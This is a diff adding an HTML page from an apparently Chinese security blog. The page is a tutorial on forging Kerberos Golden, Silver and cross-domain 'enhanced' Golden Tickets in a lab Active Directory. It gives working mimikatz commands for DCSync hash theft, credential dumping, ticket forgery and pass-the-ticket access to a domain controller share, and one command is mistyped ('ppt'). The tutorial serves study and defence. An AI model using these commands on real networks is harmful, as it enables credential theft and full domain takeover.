@@ -1,0 +1,75 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 域渗透-Ticket · Uknow - Stay hungry Stay foolish</title><meta name="description" content="域渗透-Ticket - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">域渗透-Ticket</h1><div class="post-time">Aug 24, 2019</div><div class="post-content"><h3><span id="goldenticket">GoldenTicket</span></h3><h4><span id="简介">简介</span></h4><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
+<p><strong>制作金票的条件：</strong></p>
+<blockquote>
+<p>1、域名称</p>
+<p>2、域的SID值</p>
+<p>3、域的KRBTGT账户密码HASH</p>
+<p>4、伪造用户名，可以是任意的</p>
+</blockquote>
+<h4><span id="利用过程">利用过程</span></h4><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p>命令获取krbtgt的值。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542295163.png" alt="1566542295163"></p>
+<p>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<p>参数说明：</p>
+<blockquote>
+<p>/admin：伪造的用户名</p>
+<p>/domain：域名称</p>
+<p>/sid：SID值，注意是去掉最后一个-后面的值</p>
+<p>/krbtgt：krbtgt的HASH值</p>
+<p>/ticket：生成的票据名称</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543225966.png" alt="1566543225966"></p>
+<p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542805439.png" alt="1566542805439"></p>
+<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543260644.png" alt="1566543260644"></p>
+<h3><span id="silvertickets">SilverTickets</span></h3><h4><span id="简介">简介</span></h4><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
+<p><strong>制作银票的条件：</strong></p>
+<blockquote>
+<p>1.域名称</p>
+<p>2.域的SID值</p>
+<p>3.域的服务账户的密码HASH（不是krbtgt，是域控）</p>
+<p>4.伪造的用户名，可以是任意用户名，这里是silver</p>
+</blockquote>
+<h4><span id="利用过程">利用过程</span></h4><p>首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566649973247.png" alt="1566649973247"></p>
+<p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p>
+<p>参数说明：</p>
+<blockquote>
+<p>/domain：当前域名称</p>
+<p>/sid：SID值，和金票一样取前面一部分</p>
+<p>/target：目标主机，这里是OWA2010SP3.0day.org</p>
+<p>/service：服务名称，这里需要访问共享文件，所以是cifs</p>
+<p>/rc4：目标主机的HASH值</p>
+<p>/user：伪造的用户名</p>
+<p>/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654188946.png" alt="1566654188946"></p>
+<p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654225879.png" alt="1566654225879"></p>
+<p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566654265383.png" alt="1566654265383"></p>
+<h3><span id="enhancedgolden-tickets">EnhancedGolden Tickets</span></h3><p>在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。</p>
+<h4><span id="域树与域林">域树与域林</span></h4><p>在下图中 UKNOWSEC.CN 为其他两个域的根域，NEWS.UKNOWSEC.CN和 DEV.UKNOWSEC.CN 均为 UKNOWSEC.CN的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于 UKNOWSEC.CN这个根域，但又独立运作。同样 TEST.COM 也是一个单独的域树，两个域树 UKONWSE.CN 和 TEST.CN 组合起来被称为一个域林。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566656866798.png" alt="1566656866798"></p>
+<h4><span id="普通金票的局限性">普通金票的局限性</span></h4><p>在上图中说到UKNOWSEC.CN为其他两个域（NEWS.UKNOWSEC.CN和DEV.UKNOWSEC.CN）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。而域正是根据Enterprise Admins组来实现这样的权限划分。</p>
+<p><strong>Enterprise Admins组</strong></p>
+<p>EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是UKNOWSEC.CN中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。</p>
+<p>UKNOWSEC.CN的域控上Enterprise Admins组的RID为519.</p>
+<p><strong>Domain Admins组</strong></p>
+<p>子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。NEWS.UKNOWSEC.CN这个子域中的Administrator用户，这个Administrator有当前域的最高权限。</p>
+<h4><span id="突破限制">突破限制</span></h4><p>普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。</p>
+<p>如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</p>
+<p>然后通过mimikatz重新生成包含根域SID的新的金票</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
+<p>Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。</p>
+<p>注意这里是不知道根域UKONWSEC.CN的krbtgt的密码HASH的，使用的是子域NEWS.UKNOWSEC.CN中的KRBTGT的密码HASH。</p>
+<p>然后就可以通过dir访问DC. UKNOWSEC的共享文件夹，此时的这个票据票是拥有整个域林的控制权的。</p>
+<h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/197160.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/197160.html</a></p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/域渗透-MS14-068.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
